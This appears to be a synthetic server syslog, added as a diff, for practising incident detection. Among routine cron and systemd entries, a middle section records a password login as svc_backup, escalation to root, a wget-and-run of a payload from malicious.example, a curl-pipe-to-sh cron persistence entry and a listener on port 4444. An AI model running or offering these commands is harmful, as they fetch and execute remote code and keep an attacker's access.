@@ -1,0 +1,352 @@
+Oct 24 00:31:42 webserver-01 CRON[1000]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+Oct 24 00:33:43 webserver-01 systemd: service started
+Oct 24 00:34:21 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 00:36:14 webserver-01 systemd: service started
+Oct 24 00:38:43 webserver-01 rsyslogd: service started
+Oct 24 00:39:12 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 00:41:23 webserver-01 apt[1300+i]: Starting package update check
+Oct 24 00:42:00 webserver-01 rsyslogd: service started
+Oct 24 00:42:43 webserver-01 apt[1300+i]: Starting package update check
+Oct 24 00:43:18 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 00:44:35 webserver-01 systemd: service started
+Oct 24 00:47:22 webserver-01 apt[1300+i]: Starting package update check
+Oct 24 00:47:54 webserver-01 rsyslogd: service started
+Oct 24 00:48:25 webserver-01 CRON[1013]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+Oct 24 00:49:59 webserver-01 apt[1300+i]: Starting package update check
+Oct 24 00:50:55 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 00:53:41 webserver-01 sshd[1216]: Server listening on 0.0.0.0 port 22.
+Oct 24 00:56:24 webserver-01 CRON[1017]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+Oct 24 00:57:10 webserver-01 rsyslogd: service started
+Oct 24 00:59:05 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 01:01:45 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 01:04:29 webserver-01 systemd: service started
+Oct 24 01:07:27 webserver-01 rsyslogd: service started
+Oct 24 01:09:54 webserver-01 apt[1300+i]: Starting package update check
+Oct 24 01:11:34 webserver-01 nginx: service started
+Oct 24 01:14:23 webserver-01 nginx: service started
+Oct 24 01:16:15 webserver-01 sshd[1226]: Server listening on 0.0.0.0 port 22.
+Oct 24 01:17:38 webserver-01 CRON[1027]: (root) CMD (   cd / && run-parts --report /etc/cron.hourly)
+Oct 24 01:19:00 webserver-01 kernel: [    0.000000] Initializing cgroup subsys cpuset
+Oct 24 01:21:47 webserver-01 sshd[1229]: Server listening on 0.0.0.0 port 22.
+Oct 24 01:26:45 webserver-01 CRON[2000]: (daemon) CMD (backup-script.sh)
+Oct 24 01:31:04 webserver-01 CRON[2001]: (syslog) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 01:32:34 webserver-01 CRON[2002]: (daemon) CMD (updatedb)
+Oct 24 01:35:59 webserver-01 CRON[2003]: (ubuntu) CMD (certbot renew --quiet)
+Oct 24 01:40:04 webserver-01 CRON[2004]: (root) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 01:45:19 webserver-01 CRON[2005]: (syslog) CMD (backup-script.sh)
+Oct 24 01:51:44 webserver-01 CRON[2006]: (syslog) CMD (certbot renew --quiet)
+Oct 24 01:57:10 webserver-01 CRON[2007]: (daemon) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 01:58:27 webserver-01 CRON[2008]: (syslog) CMD (certbot renew --quiet)
+Oct 24 02:04:53 webserver-01 CRON[2009]: (root) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 02:11:22 webserver-01 CRON[2010]: (syslog) CMD (certbot renew --quiet)
+Oct 24 02:14:17 webserver-01 CRON[2011]: (daemon) CMD (backup-script.sh)
+Oct 24 02:14:58 webserver-01 CRON[2012]: (daemon) CMD (backup-script.sh)
+Oct 24 02:16:54 webserver-01 CRON[2013]: (root) CMD (certbot renew --quiet)
+Oct 24 02:17:54 webserver-01 CRON[2014]: (ubuntu) CMD (backup-script.sh)
+Oct 24 02:19:30 webserver-01 CRON[2015]: (ubuntu) CMD (certbot renew --quiet)
+Oct 24 02:23:20 webserver-01 CRON[2016]: (daemon) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 02:25:15 webserver-01 CRON[2017]: (daemon) CMD (certbot renew --quiet)
+Oct 24 02:30:26 webserver-01 CRON[2018]: (syslog) CMD (updatedb)
+Oct 24 02:34:36 webserver-01 CRON[2019]: (syslog) CMD (certbot renew --quiet)
+Oct 24 02:38:09 webserver-01 CRON[2020]: (daemon) CMD (updatedb)
+Oct 24 02:39:56 webserver-01 CRON[2021]: (root) CMD (updatedb)
+Oct 24 02:41:43 webserver-01 CRON[2022]: (ubuntu) CMD (updatedb)
+Oct 24 02:42:19 webserver-01 CRON[2023]: (daemon) CMD (updatedb)
+Oct 24 02:45:03 webserver-01 CRON[2024]: (syslog) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 02:46:47 webserver-01 CRON[2025]: (daemon) CMD (backup-script.sh)
+Oct 24 02:52:29 webserver-01 CRON[2026]: (syslog) CMD (updatedb)
+Oct 24 02:58:52 webserver-01 CRON[2027]: (root) CMD (certbot renew --quiet)
+Oct 24 03:05:10 webserver-01 CRON[2028]: (daemon) CMD (certbot renew --quiet)
+Oct 24 03:09:04 webserver-01 CRON[2029]: (daemon) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:13:40 webserver-01 CRON[2030]: (daemon) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:15:47 webserver-01 CRON[2031]: (root) CMD (updatedb)
+Oct 24 03:20:02 webserver-01 CRON[2032]: (ubuntu) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:23:26 webserver-01 CRON[2033]: (root) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:23:56 webserver-01 CRON[2034]: (ubuntu) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:27:32 webserver-01 CRON[2035]: (root) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:29:48 webserver-01 CRON[2036]: (daemon) CMD (updatedb)
+Oct 24 03:35:42 webserver-01 CRON[2037]: (syslog) CMD (backup-script.sh)
+Oct 24 03:41:20 webserver-01 CRON[2038]: (syslog) CMD (certbot renew --quiet)
+Oct 24 03:42:52 webserver-01 CRON[2039]: (root) CMD (certbot renew --quiet)
+Oct 24 03:47:20 webserver-01 CRON[2040]: (daemon) CMD (certbot renew --quiet)
+Oct 24 03:50:29 webserver-01 CRON[2041]: (root) CMD (updatedb)
+Oct 24 03:51:51 webserver-01 CRON[2042]: (syslog) CMD (backup-script.sh)
+Oct 24 03:56:26 webserver-01 CRON[2043]: (ubuntu) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 03:58:41 webserver-01 CRON[2044]: (syslog) CMD (updatedb)
+Oct 24 04:05:04 webserver-01 CRON[2045]: (root) CMD (backup-script.sh)
+Oct 24 04:11:03 webserver-01 CRON[2046]: (root) CMD (backup-script.sh)
+Oct 24 04:15:58 webserver-01 CRON[2047]: (syslog) CMD (updatedb)
+Oct 24 04:19:30 webserver-01 CRON[2048]: (ubuntu) CMD (backup-script.sh)
+Oct 24 04:25:25 webserver-01 CRON[2049]: (ubuntu) CMD (updatedb)
+Oct 24 04:27:57 webserver-01 CRON[2050]: (daemon) CMD (updatedb)
+Oct 24 04:30:09 webserver-01 CRON[2051]: (daemon) CMD (backup-script.sh)
+Oct 24 04:30:53 webserver-01 CRON[2052]: (root) CMD (backup-script.sh)
+Oct 24 04:35:24 webserver-01 CRON[2053]: (syslog) CMD (updatedb)
+Oct 24 04:41:48 webserver-01 CRON[2054]: (syslog) CMD (certbot renew --quiet)
+Oct 24 04:48:28 webserver-01 CRON[2055]: (syslog) CMD (backup-script.sh)
+Oct 24 04:49:39 webserver-01 CRON[2056]: (ubuntu) CMD (logrotate -f /etc/logrotate.conf)
+Oct 24 04:52:05 webserver-01 CRON[2057]: (daemon) CMD (updatedb)
+Oct 24 04:55:27 webserver-01 CRON[2058]: (ubuntu) CMD (certbot renew --quiet)
+Oct 24 05:01:16 webserver-01 CRON[2059]: (root) CMD (certbot renew --quiet)
+Oct 24 20:30:00 webserver-01 sshd[4500]: Accepted password for svc_backup from 198.51.100.23 port 42318 ssh2
+Oct 24 20:30:00 webserver-01 sshd[4500]: pam_unix(sshd:session): session opened for user svc_backup by (uid=0)
+Oct 24 20:30:10 webserver-01 sshd[4501]: pam_unix(sshd:session): session closed for user svc_backup
+Oct 24 20:30:20 webserver-01 sshd[4502]: pam_unix(sshd:session): session closed for user svc_backup
+Oct 24 20:30:30 webserver-01 sshd[4503]: pam_unix(sshd:session): session closed for user svc_backup
+Oct 24 20:30:40 webserver-01 sshd[4504]: pam_unix(sshd:session): session closed for user svc_backup
+Oct 24 20:30:50 webserver-01 sshd[4505]: pam_unix(sshd:session): session closed for user svc_backup
+Oct 24 20:35:00 webserver-01 su: pam_unix(su:session): session opened for user root by svc_backup(uid=1001)
+Oct 24 20:35:12 webserver-01 sh[5000]: wget http://malicious.example/payload.sh -O /tmp/payload.sh
+Oct 24 20:35:18 webserver-01 sh[5001]: chmod +x /tmp/payload.sh && /tmp/payload.sh
+Oct 24 20:35:26 webserver-01 sh[5002]: /tmp/payload.sh: line 1: python: command not found
+Oct 24 20:35:30 webserver-01 sh[5003]: /tmp/payload.sh: executing additional installer
+Oct 24 20:35:40 webserver-01 CRON[5010]: (svc_backup) CMD (echo "*/5 * * * * svc_backup /usr/bin/curl -s http://malicious.example/payload.sh | sh" > /var/spool/cron/crontabs/svc_backup)
+Oct 24 20:35:46 webserver-01 cron: (CRON) info (No MTA installed, discarding output)
+Oct 24 20:38:52 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 20:40:03 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 20:41:55 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 20:43:36 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 20:46:36 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 20:50:08 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 20:53:43 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 20:55:14 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 20:56:29 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 20:57:56 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 21:02:04 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:06:16 webserver-01 kernel: audit: type=1400 audit(1698170000.11): apparmor="STATUS"
+Oct 24 21:07:45 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 21:12:35 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:12:55 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 21:13:57 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 21:15:18 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 21:17:07 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:17:31 webserver-01 kernel: audit: type=1400 audit(1698170000.18): apparmor="STATUS"
+Oct 24 21:19:29 webserver-01 kernel: audit: type=1400 audit(1698170000.19): apparmor="STATUS"
+Oct 24 21:23:55 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:26:51 webserver-01 kernel: audit: type=1400 audit(1698170000.21): apparmor="STATUS"
+Oct 24 21:31:39 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 21:32:56 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 21:36:07 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 21:40:41 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 21:45:07 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:49:49 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:54:27 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 21:54:46 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 21:56:29 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 21:56:41 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 21:58:19 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 22:02:31 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:03:42 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:04:23 webserver-01 kernel: audit: type=1400 audit(1698170000.35): apparmor="STATUS"
+Oct 24 22:08:58 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:13:52 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 22:14:56 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:15:35 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 22:17:22 webserver-01 kernel: audit: type=1400 audit(1698170000.40): apparmor="STATUS"
+Oct 24 22:17:53 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 22:22:22 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 22:27:19 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 22:28:01 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 22:30:57 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:35:25 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:39:57 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 22:42:28 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 22:46:58 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:51:12 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:53:28 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:55:50 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 22:57:43 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 22:59:03 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 23:00:15 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 23:04:11 webserver-01 kernel: audit: type=1400 audit(1698170000.56): apparmor="STATUS"
+Oct 24 23:04:58 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:08:47 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 23:10:45 webserver-01 kernel: audit: type=1400 audit(1698170000.59): apparmor="STATUS"
+Oct 24 23:11:57 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:15:14 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:17:33 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:21:42 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:22:40 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 23:26:59 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:29:03 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:32:53 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 24 23:36:29 webserver-01 kernel: audit: type=1400 audit(1698170000.68): apparmor="STATUS"
+Oct 24 23:40:14 webserver-01 systemd: Started Daily apt download activities.
+Oct 24 23:43:26 webserver-01 kernel: audit: type=1400 audit(1698170000.70): apparmor="STATUS"
+Oct 24 23:44:23 webserver-01 kernel: audit: type=1400 audit(1698170000.71): apparmor="STATUS"
+Oct 24 23:44:42 webserver-01 kernel: audit: type=1400 audit(1698170000.72): apparmor="STATUS"
+Oct 24 23:49:35 webserver-01 systemd-logind: new session 100 of user ubuntu.
+Oct 24 23:53:30 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 24 23:56:56 webserver-01 kernel: audit: type=1400 audit(1698170000.75): apparmor="STATUS"
+Oct 25 00:01:30 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 25 00:04:11 webserver-01 dbus[1000]: [system] Activated service name='org.freedesktop.hostname1'
+Oct 25 00:04:53 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 25 00:07:00 webserver-01 rsyslogd: action 'action 17' resumed
+Oct 25 00:17:00 webserver-01 CRON[6000]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:17:00 webserver-01 sh[6000]: /tmp/payload.sh: starting background listener
+Oct 25 00:17:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:17:48 webserver-01 sshd[7000]: Failed password for invalid user test from 203.0.113.45 port 20000 ssh2
+Oct 25 00:19:25 webserver-01 sshd[7001]: Failed password for invalid user test from 203.0.113.45 port 20001 ssh2
+Oct 25 00:22:00 webserver-01 CRON[6001]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:22:00 webserver-01 sh[6001]: /tmp/payload.sh: starting background listener
+Oct 25 00:22:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:23:06 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:25:23 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:27:00 webserver-01 CRON[6002]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:27:00 webserver-01 sh[6002]: /tmp/payload.sh: starting background listener
+Oct 25 00:27:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:29:51 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:30:41 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:32:00 webserver-01 CRON[6003]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:32:00 webserver-01 sh[6003]: /tmp/payload.sh: starting background listener
+Oct 25 00:32:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:32:19 webserver-01 sshd[7006]: Failed password for invalid user test from 203.0.113.45 port 20006 ssh2
+Oct 25 00:32:32 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:33:19 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:35:39 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:37:00 webserver-01 CRON[6004]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:37:00 webserver-01 sh[6004]: /tmp/payload.sh: starting background listener
+Oct 25 00:37:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:38:37 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:40:59 webserver-01 sshd[7011]: Failed password for invalid user test from 203.0.113.45 port 20011 ssh2
+Oct 25 00:42:00 webserver-01 CRON[6005]: (svc_backup) CMD (/bin/sh /tmp/payload.sh)
+Oct 25 00:42:00 webserver-01 sh[6005]: /tmp/payload.sh: starting background listener
+Oct 25 00:42:00 webserver-01 kernel: [  +0.000000] netfilter: IN=eth0 OUT= MAC= SRC=198.51.100.23 DST=10.0.0.5 PROTO=TCP SPT=42318 DPT=4444
+Oct 25 00:47:07 webserver-01 sshd[7012]: Failed password for invalid user test from 203.0.113.45 port 20012 ssh2
+Oct 25 00:48:34 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:51:18 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:53:08 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:54:44 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:56:57 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 00:57:11 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 00:58:53 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:02:46 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 01:08:23 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:11:49 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:13:44 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:19:50 webserver-01 sshd[7024]: Failed password for invalid user test from 203.0.113.45 port 20024 ssh2
+Oct 25 01:22:52 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:23:04 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 01:29:28 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:30:01 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 01:33:21 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:35:50 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:36:18 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:40:11 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 01:43:22 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:48:07 webserver-01 sshd[7034]: Failed password for invalid user test from 203.0.113.45 port 20034 ssh2
+Oct 25 01:50:50 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:53:46 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:58:08 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 01:58:15 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 01:59:05 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:04:10 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:04:26 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:05:14 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:11:43 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:17:54 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:24:30 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:25:51 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:27:10 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:33:21 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:39:41 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:44:14 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:44:27 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:50:36 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 02:52:38 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:53:04 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 02:56:13 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:00:09 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:05:34 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:07:54 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 03:08:34 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:13:13 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 03:17:47 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 03:24:09 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:26:29 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:28:32 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:32:49 webserver-01 sshd[7065]: Failed password for invalid user test from 203.0.113.45 port 20065 ssh2
+Oct 25 03:38:44 webserver-01 sshd[7066]: Failed password for invalid user test from 203.0.113.45 port 20066 ssh2
+Oct 25 03:44:12 webserver-01 sshd[7067]: Failed password for invalid user test from 203.0.113.45 port 20067 ssh2
+Oct 25 03:45:32 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:51:31 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:51:42 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 03:57:31 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 03:59:27 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:03:56 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:10:33 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:15:19 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:16:07 webserver-01 sshd[7076]: Failed password for invalid user test from 203.0.113.45 port 20076 ssh2
+Oct 25 04:20:06 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:24:30 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:26:52 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:28:44 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:29:35 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:34:08 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:39:21 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:40:23 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:44:36 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:48:52 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 04:55:09 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 04:58:10 webserver-01 sshd[7088]: Failed password for invalid user test from 203.0.113.45 port 20088 ssh2
+Oct 25 05:01:04 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 05:07:33 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:09:18 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:11:51 webserver-01 sshd[7092]: Failed password for invalid user test from 203.0.113.45 port 20092 ssh2
+Oct 25 05:15:15 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:18:24 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:18:53 webserver-01 sshd[7095]: Failed password for invalid user test from 203.0.113.45 port 20095 ssh2
+Oct 25 05:24:36 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:26:48 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:29:34 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 05:32:50 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:33:09 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:37:57 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:38:27 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:43:46 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:46:17 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:51:03 webserver-01 sudo:    ubuntu : TTY=pts/1 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/usr/bin/apt update
+Oct 25 05:55:09 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:57:24 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 05:59:42 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:03:54 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:05:24 webserver-01 sshd[7110]: Failed password for invalid user test from 203.0.113.45 port 20110 ssh2
+Oct 25 06:09:45 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:11:42 webserver-01 systemd: Stopping User Manager for UID 1001
+Oct 25 06:18:15 webserver-01 sshd[7113]: Failed password for invalid user test from 203.0.113.45 port 20113 ssh2
